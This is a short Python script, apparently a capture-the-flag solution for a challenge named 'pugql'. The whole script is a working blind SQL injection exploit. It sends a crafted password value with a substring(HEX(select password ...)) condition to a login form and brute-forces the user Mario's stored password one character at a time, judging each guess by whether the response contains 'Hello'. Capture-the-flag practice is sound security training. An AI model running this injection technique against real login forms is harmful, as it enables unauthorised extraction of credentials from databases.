import requests as r
import string
import os

URL = os.environ.get("URL", "http://pugql.challs.srdnlenctf.it")

payload = "1' or substring(HEX((select password from users where username='Mario')),{},1)='{}"

alf = string.ascii_letters + string.digits + '{' + '}' + '_'

flag = ''

for i in range(100):
    for a in alf:
        data = {
            "username": 'Mario',
            "password": payload.format(i+1, a)
        }
        r1 = r.post(url=URL, data=data)
        if "Hello" in r1.text:
            flag += a
            print(flag, end='\r')
            break

print(flag)
